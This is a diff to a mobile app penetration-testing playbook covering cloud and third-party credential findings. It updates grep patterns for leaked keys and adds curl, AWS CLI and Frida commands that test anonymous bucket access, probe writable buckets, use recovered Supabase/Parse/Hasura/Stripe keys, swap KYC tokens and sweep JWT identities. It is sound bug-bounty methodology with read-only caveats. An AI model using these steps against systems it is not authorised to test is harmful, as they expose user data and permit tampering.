-| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES) |
+| **VRT** | `cloud_security.identity_and_access_management_iam_misconfigurations.publicly_accessible_iam_credentials` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps using Azure Blob/Table/Queue storage or an Azure-backed SDK |
+| **Requires** | — |
 | **Maps to** | CWE-798; MASWE-0004; API8:2023 |
 
 - **Test:** Azure ships its credential as a single connection string (`DefaultEndpointsProtocol=…;AccountName=…;AccountKey=…`) or as a shared-access-signature URL. The account key is an account-wide credential; a SAS is scoped but frequently over-scoped and long-lived.
 - **How:**
 ```bash
-grep -rnoE 'DefaultEndpointsProtocol=[^"]+AccountKey=[A-Za-z0-9+/=]{60,}' out/ | sort -u
-grep -rnoE 'SharedAccessSignature|[a-z0-9]+\.blob\.core\.windows\.net/[A-Za-z0-9._-]+' out/ | sort -u
-grep -rnoE 'sv=20[0-9]{2}-[0-9]{2}-[0-9]{2}&[^"'\'' ]*sig=[A-Za-z0-9%+/=]{20,}' out/ | sort -u
+grep -rnoE 'DefaultEndpointsProtocol=[^"]+AccountKey=[A-Za-z0-9+/=]{60,}' "$DEC" | sort -u
+grep -rnoE 'SharedAccessSignature|[a-z0-9]+\.blob\.core\.windows\.net/[A-Za-z0-9._-]+' "$DEC" | sort -u
+grep -rnoE 'sv=20[0-9]{2}-[0-9]{2}-[0-9]{2}&[^"'\'' ]*sig=[A-Za-z0-9%+/=]{20,}' "$DEC" | sort -u
 # container listing with a recovered SAS (read-only)
 curl -s "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list&<SAS>" | head -c 800
 # anonymous container listing, no credential at all
@@ -1162,13 +1208,14 @@ python3 -c "import urllib.parse,sys;print(urllib.parse.parse_qs(sys.argv[1]))" '
 | **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES — rate on demonstrated data); `cloud_security.storage_misconfigurations.unencrypted_sensitive_data_at_rest` (P2) |
 | **Attacker** | AM-01 |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | Mobile Top 10 2024 M9 (its own example list includes "misconfiguring cloud storage permissions—allowing unauthorized data access") and M8; MASWE-0004; API8:2023; Xiaomi General Assessment Rules ("whether the data or link should have access restricted" and "the sensitivity of the data or link exposed to the public" — pre-answer both in the report) |
 
 - **Test:** Harvest every bucket/container/CDN host from the package and test anonymous listing on each. Bucket names embedded in the client are frequently readable without credentials.
 - **How:**
 ```bash
 grep -rhoE '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com|s3://[a-z0-9.-]+|storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9]+\.blob\.core\.windows\.net|[a-z0-9-]+\.oss-[a-z0-9-]+\.aliyuncs\.com' \
-  out/ | sort -u > buckets.txt ; wc -l buckets.txt
+  "$DEC" | sort -u > buckets.txt ; wc -l buckets.txt
 curl -s "https://<bucket>.s3.amazonaws.com/?list-type=2&max-keys=20" | head -c 800
 aws s3 ls "s3://<bucket>" --no-sign-request
 aws s3api get-bucket-acl --bucket <bucket> --no-sign-request 2>&1 | head
@@ -1184,16 +1231,17 @@ curl -s "https://storage.googleapis.com/storage/v1/b/<bucket>/o?maxResults=20" |
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for targeted overwrite |
+| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for targeted overwrite |
 | **Attacker** | AM-01 |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | API8:2023; the corpus's rating rule from H1 #351555 — "those keys give me ability to not only access the files, but also replace and delete them" |
 
 - **Test:** World-writable beats world-readable by a band. Test a **benign** `PutObject` into a scratch key, read it back, delete it.
 - **How:**
 ```bash
 M=hq82rv5t
-aws s3 cp /dev/null "s3://<bucket>/pt_$M.txt" --no-sign-request
+printf '%s' "$M" | aws s3 cp - "s3://<bucket>/pt_$M.txt" --no-sign-request   # never /dev/null: the CLI skips special files with a warning and exit 0, so the ls that follows reports a writable bucket as not writable
 aws s3 ls "s3://<bucket>/pt_$M.txt" --no-sign-request
 aws s3 rm "s3://<bucket>/pt_$M.txt" --no-sign-request
 # or plain HTTP
@@ -1201,7 +1249,7 @@ curl -s -i -X PUT --data "$M" "https://<bucket>.s3.amazonaws.com/pt_$M.txt" | he
 curl -s "https://<bucket>.s3.amazonaws.com/pt_$M.txt"
 curl -s -i -X DELETE "https://<bucket>.s3.amazonaws.com/pt_$M.txt" | head -1
 ```
-- **Proof:** The written marker returned by an independent `GET`, then the delete confirmation and a final empty read. A `200` on the `PUT` alone is not proof (D18-071). Say in the report that you wrote one zero-byte object to a scratch key and removed it.
+- **Proof:** The written marker returned by an independent `GET`, then the delete confirmation and a final empty read. A `200` on the `PUT` alone is not proof (D18-071). Say in the report that you wrote one 8-byte marker object to a scratch key and removed it.
 - **Escalation:** A writable bucket the app loads content, config or code from is content injection into every install -> D10 / -> D17 / -> D02; a writable bucket on a trusted origin is a stored-XSS primitive -> D15 CORS/subdomain chain.
 - **Ruled out when:** `PutObject` returns `AccessDenied` at the bucket root, at any per-user prefix pattern from the source, and with every credential set recovered in this chapter. Record the prefix list you tried.
 
@@ -1210,17 +1258,18 @@ curl -s -i -X DELETE "https://<bucket>.s3.amazonaws.com/pt_$M.txt" | head -1
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES) |
+| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps serving assets from cloud storage |
+| **Requires** | — |
 | **Maps to** | H1 #1021906 ($2,900), #361438 |
 
 - **Test:** Bucket names are a single global namespace, so `<org>-assets`, `<app>-prod`, `<brand>-static` exist for *someone*. Generate permutations from the package's own vocabulary, then triage ownership before writing anything up.
 - **How:**
 ```bash
 # vocabulary from the package itself, not from imagination
-{ grep -oE 'package="[^"]+"' out/AndroidManifest.xml | cut -d'"' -f2 | tr '.' '\n'
-  grep -rhoE '[a-z0-9-]{4,}\.(com|net|io|co\.uk)' out/res out/assets | cut -d. -f1
+{ grep -oE 'package="[^"]+"' $MF | cut -d'"' -f2 | tr '.' '\n'
+  grep -rhoE '[a-z0-9-]{4,}\.(com|net|io|co\.uk)' $R $A | cut -d. -f1
 } | sort -u > words.txt
 python3 - <<'PY'
 import itertools, urllib.request
@@ -1248,9 +1297,10 @@ PY
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES); rate at the content-injection impact |
+| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies); rate at the content-injection impact |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps that fetch content from a bucket or CDN host named in the package |
+| **Requires** | — |
 | **Maps to** | The corpus's BackBlaze Android bucket-takeover write-up (indexed in iamsarvagyaa/AndroidSecNotes) |
 
 - **Test:** If a bucket the app still requests has been deleted, the name is claimable in the global namespace and whoever claims it serves content to every install.
@@ -1287,7 +1337,7 @@ curl -s "https://<bucket>.s3.amazonaws.com/?list-type=2&max-keys=1000" \
   | awk -F/ '{ for(i=1;i<NF;i++) printf "%s/", ($i ~ /^[0-9]+$/ ? "<N>" : ($i ~ /^[0-9a-f-]{36}$/ ? "<GUID>" : $i)); print $NF }' \
   | sed -E 's/[^/]+$/<FILE>/' | sort | uniq -c | sort -rn | head -20
 # does the app build the URL itself?
-grep -rnE 'https?://[^"]*(s3|storage\.googleapis|blob\.core\.windows)[^"]*"|getUrl\(|buildUpon\(\)' out/sources/ | head -20
+grep -rnE 'https?://[^"]*(s3|storage\.googleapis|blob\.core\.windows)[^"]*"|getUrl\(|buildUpon\(\)' $S/ | head -20
 ```
   Then, with two accounts you control, fetch account B's object path while holding account A's session.
 - **Proof:** Account B's object retrieved with account A's identity — your own uid/identity id visible in the evidence beside the victim path. State whether the path was iterable (P1 band) or GUID-keyed (P4 band); the distinction changes the VRT node.
@@ -1301,15 +1351,15 @@ grep -rnE 'https?://[^"]*(s3|storage\.googleapis|blob\.core\.windows)[^"]*"|getU
 | **Severity ceiling** | Critical |
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
 | **Attacker** | AM-01 |
-| **Applies to** | Apps built on Supabase, Appwrite, PocketBase or any PostgREST-style BaaS |
+| **Applies to** | Apps built on Supabase, Appwrite, PocketBase, Parse Server / Back4App, Hasura, MongoDB Atlas App Services / Data API, or any PostgREST- or GraphQL-style BaaS |
 | **Requires** | backend-api |
 | **Maps to** | API1:2023 (object-level authorisation delegated to policies that do not check ownership); API8:2023 |
 
 - **Test:** These platforms ship a public `anon`/publishable key in the client and rely entirely on row-level security. If RLS is off, or a policy is `USING (true)`, the anon key is a full database client — and it is in every install.
 - **How:**
 ```bash
-grep -rnE 'supabase\.co|supabase\.in|appwrite|pocketbase|anon[_-]?key|publishable|service_role' \
-  out/res/values/strings.xml out/sources out/assets | sort -u
+grep -rnE 'supabase\.co|supabase\.in|appwrite|pocketbase|anon[_-]?key|publishable|service_role|X-Parse-Application-Id|X-Parse-REST-API-Key|X-Parse-Master-Key|parseapi\.|back4app|hasura|x-hasura-admin-secret|data\.mongodb-api\.com|realm-mongodb|AppConfiguration' \
+  $R/values/strings.xml $S $A | sort -u
 ANON=<anon key>; REF=<project ref>
 # enumerate the exposed schema from the generated OpenAPI document
 curl -s "https://$REF.supabase.co/rest/v1/" -H "apikey: $ANON" | jq -r '.definitions | keys[]'
@@ -1320,10 +1370,17 @@ curl -s "https://$REF.supabase.co/rest/v1/users?select=*&limit=5" \
 curl -s -i -X POST "https://$REF.supabase.co/rest/v1/<table>" \
   -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -H 'Content-Type: application/json' \
   -d '{"note":"wq61bk3n"}' | head -3
+# Parse: open class-level permissions on _User with the REST key = P1; a MASTER key in the APK = full compromise, file as its own primitive
+curl -s "https://<parse-host>/classes/_User?limit=3" -H "X-Parse-Application-Id: <appid>" -H "X-Parse-REST-API-Key: <restkey>" | head -c 400
+curl -s "https://<parse-host>/schemas" -H "X-Parse-Application-Id: <appid>" -H "X-Parse-Master-Key: <candidate>" | jq -r '.results[]?.className // .error'
+# Hasura: the admin secret bypasses every permission rule
+curl -s "https://<host>/v1/graphql" -H "x-hasura-admin-secret: <candidate>" -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name } } }"}' | head -c 300
+# Atlas Data API / App Services: an apiKey or anonymous-auth app id reaches collections through the rules only
+curl -s -X POST "https://<region>.data.mongodb-api.com/app/<appid>/endpoint/data/v1/action/find" -H "apiKey: <candidate>" -H 'Content-Type: application/json' -d '{"dataSource":"<cluster>","database":"<db>","collection":"users","limit":3}' | head -c 400
 ```
 - **Proof:** Rows returned for a user-scoped table using only the key from the APK, plus the OpenAPI listing enumerating the schema. The schema listing alone is a useful secondary artefact but is not the finding.
 - **Escalation:** Grep specifically for a `service_role` key — it bypasses RLS entirely and is a full database compromise (P1, file it as its own primitive).
-- **Ruled out when:** Every table in the OpenAPI listing returns an empty array or a `permission denied for table` error with the anon key, **and** the same is true after signing up through the app and retrying with the user token (the `authenticated`-role equivalent of D18-019). No `service_role` key anywhere in the package.
+- **Ruled out when:** Every table in the OpenAPI listing returns an empty array or a `permission denied for table` error with the anon key, **and** the same is true after signing up through the app and retrying with the user token (the `authenticated`-role equivalent of D18-019). No `service_role` key anywhere in the package. No master/admin-secret-shaped string in the package either (the Parse / Hasura regex above is empty).
 
 ### D18-045 · AWS AppSync / managed GraphQL with API-key authorisation mode
 
@@ -1340,7 +1397,7 @@ curl -s -i -X POST "https://$REF.supabase.co/rest/v1/<table>" \
 - **How:**
 ```bash
 grep -rnoE '[a-z0-9-]+\.appsync-api\.[a-z0-9-]+\.amazonaws\.com/graphql|da2-[a-z0-9]{26}' \
-  out/res out/assets out/sources | sort -u
+  $R $A $S | sort -u
 EP=https://<id>.appsync-api.<region>.amazonaws.com/graphql
 KEY=da2-...
 curl -s "$EP" -H "x-api-key: $KEY" -H 'Content-Type: application/json' \
@@ -1360,15 +1417,16 @@ curl -s "$EP" -H "x-api-key: $KEY" -H 'Content-Type: application/json' \
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key reads the vendor's copy of the user base; `…intentionally_public_sample_or_invalid` (P5) for an ingest-only key |
 | **Attacker** | AM-01 |
 | **Applies to** | All apps with analytics, crash, attribution, feature-flag or search SDKs |
+| **Requires** | — |
 | **Maps to** | API8:2023, API10:2023; H1 #41856 (Crashlytics/fabric.io rendering app-supplied content, as evidence that third-party pipelines process what the app sends) |
 
 - **Test:** Most of these SDKs ship two credentials: a write-only ingest key that belongs in the client, and a management/export key that does not. Teams paste the wrong one. The distinguishing test is not the key's shape — it is whether the vendor's **read** API accepts it.
 - **How:**
 ```bash
 # harvest candidates and the vendor host set
-apkleaks -f target.apk -o apkleaks.txt
+# reuse apkleaks.json from D18-004 — do not run apkleaks again (15–20 min for the same output)
 grep -rniE 'amplitude|mixpanel|segment|braze|clevertap|moengage|leanplum|appsflyer|adjust|branch|sentry|bugsnag|datadog|instabug|launchdarkly|optimizely|algolia' \
-  out/sources/ | cut -d: -f1 | sort -u
+  $S/ | cut -d: -f1 | sort -u
 # for each key, test the vendor's READ endpoint, never its ingest endpoint
 curl -s -H "Authorization: Bearer $K" 'https://api.<vendor>.com/v1/projects'        | head -c 400
 curl -s -H "X-API-Key: $K"            'https://api.<vendor>.com/v1/export/events'   | head -c 400
@@ -1394,9 +1452,9 @@ curl -s -u "$K:" 'https://api.<vendor>.com/v1/account'                          
 - **How:**
 ```bash
 grep -rnE 'sk_(live|test)_[A-Za-z0-9]{16,}|rk_live_[A-Za-z0-9]{16,}|rzp_(live|test)_[A-Za-z0-9]{14}|key_secret|BraintreeClientToken|private_key|ADYEN_.*KEY|checkout_secret' \
-  out/sources out/res out/assets
+  $S $R $A
 # cross-platform: the key is in the Dart/Hermes/IL2CPP layer, not the dex
-grep -aoE 'sk_live_[0-9a-zA-Z]{20,}' libapp.strings out/assets/index.android.bundle 2>/dev/null | sort -u
+grep -aoE 'sk_live_[0-9a-zA-Z]{20,}' libapp.strings $A/index.android.bundle 2>/dev/null | sort -u
 # validate read-only — NEVER create a charge or a refund
 curl -s https://api.stripe.com/v1/balance -u "$SK:" | head -c 400
 curl -s https://api.razorpay.com/v1/payments?count=1 -u "$KEY_ID:$KEY_SECRET" | head -c 200
@@ -1410,7 +1468,7 @@ curl -s https://api.razorpay.com/v1/payments?count=1 -u "$KEY_ID:$KEY_SECRET" | 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.privilege_escalation` (VARIES) — rate on the value obtained; the money movement is the impact statement |
+| **VRT** | `broken_access_control.privilege_escalation` (varies) — rate on the value obtained; the money movement is the impact statement |
 | **Attacker** | AM-05 (a user of the app) |
 | **Applies to** | Apps whose order state transitions on a PSP SDK callback rather than on a server-verified webhook |
 | **Requires** | payments, backend-api, mitm |
@@ -1419,7 +1477,7 @@ curl -s https://api.razorpay.com/v1/payments?count=1 -u "$KEY_ID:$KEY_SECRET" | 
 - **Test:** The PSP SDK's local "payment succeeded" callback is client state. If the backend marks the order paid on the client's say-so rather than waiting for the PSP's server-to-server confirmation, the order completes without a charge.
 - **How:**
 ```bash
-grep -rnE 'onPaymentSuccess|onActivityResult.*payment|confirmPayment|handleNextAction|PaymentIntentResult|setPaid|markOrderPaid|paymentStatus' out/sources/
+grep -rnE 'onPaymentSuccess|onActivityResult.*payment|confirmPayment|handleNextAction|PaymentIntentResult|setPaid|markOrderPaid|paymentStatus' $S/
 # replay the confirmation the client sends, with a payment reference that does not exist
 curl -s -i -X POST https://api.target/v1/orders/$ORDER/confirm \
   -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
@@ -1437,12 +1495,13 @@ curl -s -i -X POST https://api.target/v1/orders/$ORDER/confirm \
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the credential permits write/delete of user content; `…pay_per_use_abuse` (P4) for metered read only |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps using a hosted media pipeline |
+| **Requires** | — |
 | **Maps to** | H1 #351555 (Reverb, Cloudinary api secret, Medium — the SDK's own README says "the api secret and key should be left out of the application"), #412772 (8x8, High, $500), #753868 (Zenly, Medium, $750), #440629 (Starbucks), #1641475 (GlassWire), #792850 (NordVPN) |
 
 - **Test:** These SDKs' quick-start guides tell developers to paste the full credential URL into the client, so the finding is common. Rate it on whether the credential permits **write/delete**, not just read — #351555's argument was exactly that.
 - **How:**
 ```bash
-grep -rnoE 'cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9-]+|B2_APPLICATION_KEY|b2_[a-z0-9]{25,}|CLOUDINARY_URL' out/ | sort -u
+grep -rnoE 'cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9-]+|B2_APPLICATION_KEY|b2_[a-z0-9]{25,}|CLOUDINARY_URL' "$DEC" | sort -u
 # validate with a usage/account endpoint — counters, not content
 curl -s "https://api.cloudinary.com/v1_1/<cloud>/usage" -u "<key>:<secret>" | jq .
 # confirm the scope without enumerating assets
@@ -1460,13 +1519,14 @@ curl -s "https://api.cloudinary.com/v1_1/<cloud>/resources/image?max_results=1" 
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps with a hosted search SDK |
+| **Requires** | — |
 | **Maps to** | CWE-798; API8:2023; the cross-platform corpus's explicit list of bundle-shipped keys that are "public" in name only — "Firebase server keys, Algolia admin keys, Stripe secret keys, map/billing keys with no referrer restriction" |
 
 - **Test:** Hosted search platforms issue a search-only key for the client and an admin key for the backend. They look identical. The admin key lists every index, reads every record and can delete indices.
 - **How:**
 ```bash
 grep -rniE 'algolia|application_id|search.?only.?key|admin.?api.?key|X-Algolia-API-Key|X-Algolia-Application-Id' \
-  out/res/values/strings.xml out/sources out/assets | sort -u
+  $R/values/strings.xml $S $A | sort -u
 APPID=<app id>; K=<key>
 # an admin key can list indices; a search-only key cannot
 curl -s "https://$APPID.algolia.net/1/indexes" \
@@ -1493,7 +1553,7 @@ curl -s "https://$APPID.algolia.net/1/keys/$K" \
 - **Test:** These SDKs initialise with a short-lived, applicant-scoped token that the backend must mint. Test three things: is the token long-lived, is it scoped to *your* applicant, and does swapping an applicant/inquiry id in the mint call bind your capture session to someone else's identity record.
 - **How:**
 ```bash
-grep -rniE 'sdkToken|applicantId|inquiryId|workflowRunId|onfido|sumsub|veriff|jumio|persona|withToken|init\(.*token' out/sources/
+grep -rniE 'sdkToken|applicantId|inquiryId|workflowRunId|onfido|sumsub|veriff|jumio|persona|withToken|init\(.*token' $S/
 # capture the mint call in the proxy, then substitute the identifier
 curl -s -i -X POST https://api.target/v1/kyc/sdk-token \
   -H "Authorization: Bearer $ATTACKER_TOKEN" -H 'Content-Type: application/json' \
@@ -1520,8 +1580,8 @@ echo "$SDKTOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq
 - **How:**
 ```bash
 grep -rnE 'setUserHash|Intercom\.client\(\)|registerIdentifiedUser|registerUnidentifiedUser|Zendesk.*loginUser|jwtToken|authenticationToken|Freshchat.*restoreId|identity_verification' \
-  out/sources/
-grep -rnE '[A-Za-z0-9_+/=-]{32,}' out/res/values/strings.xml | grep -iE 'intercom|zendesk|freshchat|helpshift'
+  $S/
+grep -rnE '[A-Za-z0-9_+/=-]{32,}' $R/values/strings.xml | grep -iE 'intercom|zendesk|freshchat|helpshift'
 # is the hash produced locally?  hook the setter and change the user id
 ```
 ```javascript
@@ -1543,14 +1603,15 @@ Java.perform(function () {
 | **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps embedding a support/chat SDK that mints identity tokens on-device |
+| **Requires** | — |
 | **Maps to** | Public reporting of a Zendesk Android SDK issue describing token generation that "combin[es] hardcoded secrets with sequential account IDs to create predictable JWT tokens", enumerable "without triggering rate limiting or account lockout". **The corpus read only secondary coverage and names no CVE — verify the current SDK behaviour yourself before asserting it, and do not cite a CVE.** |
 
 - **Test:** Where the SDK mints its own identity token client-side from a shared secret plus a sequential id, the token space is enumerable. Extract the secret, derive tokens across an id range, and measure the response delta.
 - **How:**
 ```bash
-grep -rn 'Jwts\.builder\|SignatureAlgorithm\.HS256\|HmacSHA256\|io/jsonwebtoken\|setIdentity\|JwtIdentity' out/sources/
-grep -rnE '"[A-Za-z0-9+/]{32,}={0,2}"' out/sources/<sdkpkg>/ | head     # candidate shared secrets
-strings -a out/res/values/strings.xml | grep -iE 'zendesk|intercom|app_id|key'
+grep -rn 'Jwts\.builder\|SignatureAlgorithm\.HS256\|HmacSHA256\|io/jsonwebtoken\|setIdentity\|JwtIdentity' $S/
+grep -rnE '"[A-Za-z0-9+/]{32,}={0,2}"' $S/<sdkpkg>/ | head     # candidate shared secrets
+strings -a $R/values/strings.xml | grep -iE 'zendesk|intercom|app_id|key'
 ```
 ```python
 # sweep in Python, with per-iteration logging and a final count — never a shell array loop
@@ -1575,7 +1636,7 @@ print(f"probed={hi-lo} nonempty200={hits}")
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES); rate at what the reachable bridge returns |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); rate at what the reachable bridge returns |
 | **Attacker** | AM-05 (the peer or agent side of the conversation) |
 | **Applies to** | Apps with embedded support chat |
 | **Requires** | webview, mitm |
@@ -1584,8 +1645,8 @@ print(f"probed={hi-lo} nonempty200={hits}")
 - **Test:** Support SDKs render conversation content in a `WebView` and many expose a bridge for actions and file previews. The content comes from the agent side, a bot template, or another user in a marketplace app. Test whether message bodies, quick replies, article previews or attachment previews execute script, and whether a bridge is reachable from that script.
 - **How:**
 ```bash
-grep -rniE 'zendesk|intercom|freshchat|helpshift|salesforce.*messaging' -l out/sources/ | head
-grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|loadDataWithBaseURL' out/sources/ \
+grep -rniE 'zendesk|intercom|freshchat|helpshift|salesforce.*messaging' -l $S/ | head
+grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|loadDataWithBaseURL' $S/ \
   | grep -iE 'zendesk|intercom|freshchat|helpshift|support|chat'
 ```
   From the agent console, or by replaying the peer's "send message" API, send:
@@ -1603,6 +1664,7 @@ grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|setAllowFileAcces
 | **VRT** | `cryptographic_weakness.key_reuse.inter_environment` (P2) |
 | **Attacker** | AM-01 |
 | **Applies to** | Apps shipping build flavours, or where a debug/staging APK is publicly obtainable |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/privacy-and-security/security-tips` — separate keys per environment and per app, restrict by IP/app certificate, prefer OAuth 2.0 scoping, rotate every 90 days to 6 months |
 
 - **Test:** Compare the credentials in the release build against those in any debug, staging, beta or internal-track build you can legitimately obtain. A shared key means the weaker environment's exposure is the production environment's exposure.
@@ -1615,7 +1677,7 @@ for v in release staging debug; do
 done
 comm -12 keys.release keys.staging
 comm -12 keys.release keys.debug
-grep -rn 'BuildConfig\.' out/sources/ | grep -iE 'api_key|secret|base_url|endpoint|environment' | head -20
+grep -rn 'BuildConfig\.' $S/ | grep -iE 'api_key|secret|base_url|endpoint|environment' | head -20
 ```
   Also check the reverse direction: a staging *endpoint* reachable with the production key (D18-012's service sweep against the staging host).
 - **Proof:** The identical key value present in both builds, with `file:line` for each, and one successful authenticated call showing the shared key reaching production.
@@ -1627,17 +1689,18 @@ grep -rn 'BuildConfig\.' out/sources/ | grep -iE 'api_key|secret|base_url|endpoi
 | | |
 |---|---|
 | **Severity ceiling** | Support |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) once paired with the runtime item; the static inventory alone is P5 |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) once paired with the runtime item; the static inventory alone is P5 |
 | **Attacker** | AM-08 |
 | **Applies to** | All |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0318 (References to SDK APIs Known to Handle Sensitive User Data), MASWE-0073, MASTG-KNOW-0026 (Third-party Services Embedded in the App); MASTG-TEST-0004 is its deprecated v1 predecessor |
 
 - **Test:** Identify every third-party SDK and, for each, the specific entry-point methods through which app data flows into the vendor. MASTG's prerequisite is to read the SDK's own documentation to learn those methods. MASTG states explicitly that this test detects only **potential** sensitive-data handling — on its own it is Informational.
 - **How:**
 ```bash
 unzip -l target.apk | grep -oE "(com|io|net|org)/[a-z0-9_/]+" | cut -d/ -f1-3 | sort -u | head -60
-grep -rn "com.google.firebase\|com.facebook\|com.amplitude\|com.mixpanel\|com.appsflyer\|io.branch\|com.adjust\|com.segment\|com.braze\|com.clevertap\|io.sentry\|com.bugsnag\|com.crashlytics" out/sources/ | cut -d: -f1 | sort -u
-grep -rnE 'FirebaseAnalytics|setUserId\(|setUserProperty\(|logEvent\(|identify\(|setCustomKey\(|setUserIdentifier\(|leaveBreadcrumb\(|track\(' out/sources/
+grep -rn "com.google.firebase\|com.facebook\|com.amplitude\|com.mixpanel\|com.appsflyer\|io.branch\|com.adjust\|com.segment\|com.braze\|com.clevertap\|io.sentry\|com.bugsnag\|com.crashlytics" $S/ | cut -d: -f1 | sort -u
+grep -rnE 'FirebaseAnalytics|setUserId\(|setUserProperty\(|logEvent\(|identify\(|setCustomKey\(|setUserIdentifier\(|leaveBreadcrumb\(|track\(' $S/
 ```
 - **Proof:** The call sites passing user data into `setUserId` / `setUserProperty` / `logEvent` and their SDK equivalents, with `file:line`.
 - **Escalation:** Feeds D18-057 (the actual finding) and the -> D20 privacy-declaration comparison. Becomes Medium/High only when paired with the runtime capture and an undeclared-collection finding.
@@ -1657,9 +1720,11 @@ grep -rnE 'FirebaseAnalytics|setUserId\(|setUserProperty\(|logEvent\(|identify\(
 - **Test:** Hook the entry points found in D18-056 and capture the **argument values** plus a stack trace while exercising the app. Argument values are what turns "potential" into a finding.
 - **How:**
 ```bash
-frida -D "$SERIAL" -f com.target.app -l sdk_hooks.js
+SERIAL=emulator-5554   # `-U` picks a device silently when several are attached; -D <serial> is mandatory in this harness
+frida -D "$SERIAL" -f com.target.app -l sdk_hooks.js -q -t 600 | tee sdk-hooks.log   # spawn resumes by default on frida-tools 17; without -t the session detaches right after script load and every hook shows zero hits
 ```
 ```javascript
+console.log('[hooks-loaded] ' + Java.available);   // positive control: a log without this line is a detached session, not a negative
 Java.perform(function () {
   var Log = Java.use('android.util.Log'), Ex = Java.use('java.lang.Exception');
   function trace(){ return Log.getStackTraceString(Ex.$new()).split('\n').slice(1,6).join(' | '); }
@@ -1667,18 +1732,19 @@ Java.perform(function () {
   FA.setUserId.implementation = function (id) { console.log('[FA.setUserId] ' + id + '\n  ' + trace()); return this.setUserId(id); };
   FA.setUserProperty.implementation = function (k, v) { console.log('[FA.setUserProperty] ' + k + '=' + v + '\n  ' + trace()); return this.setUserProperty(k, v); };
   FA.logEvent.implementation = function (n, b) { console.log('[FA.logEvent] ' + n + ' ' + (b ? b.toString() : '') + '\n  ' + trace()); return this.logEvent(n, b); };
-  // attribute every outbound request to its calling SDK
+  // attribute every outbound request to its calling SDK: newCall() is the choke point for both execute() and enqueue()
+  // (okhttp3.RealCall exists only in OkHttp 3.x; 4/5 keep it internal, and hooking execute() misses the async path every SDK uses)
   try {
-    var Call = Java.use('okhttp3.RealCall');
-    Call.execute.implementation = function () { console.log('[http] ' + this.request().url().toString() + '\n  ' + trace()); return this.execute(); };
-  } catch (e) {}
+    var Client = Java.use('okhttp3.OkHttpClient');
+    Client.newCall.implementation = function (req) { console.log('[http] ' + req.url().toString() + '\n  ' + trace()); return this.newCall(req); };
+  } catch (e) { console.log('[http] okhttp3.OkHttpClient not found — renamed under R8 or not OkHttp; resolve the class via the D18-008 anchors: ' + e); }
 });
 ```
 ```bash
-frida-trace -U -p $(adb shell pidof com.target.app) \
+frida-trace -D "$SERIAL" -p "$(adb -s "$SERIAL" shell pidof com.target.app)" \
   -j '*analytics*!*/iu' -j '*firebase*!log*/i' -j '*appsflyer*!*/i' -o sdk.log
 ```
-- **Proof:** A hook log line showing real PII or credential material handed to a third-party SDK method, with the stack trace naming the app class that supplied it, **and** the corresponding outbound request to the vendor host captured in the proxy. Both halves — the hook without the wire capture is weaker.
+- **Proof:** A hook log line showing real PII or credential material handed to a third-party SDK method, with the stack trace naming the app class that supplied it, **and** the corresponding outbound request to the vendor host captured in the proxy. Both halves — the hook without the wire capture is weaker. A log with no `[hooks-loaded]` line is a detached session, not a negative. Decode the body per D18-058 before claiming which app or field was transmitted.
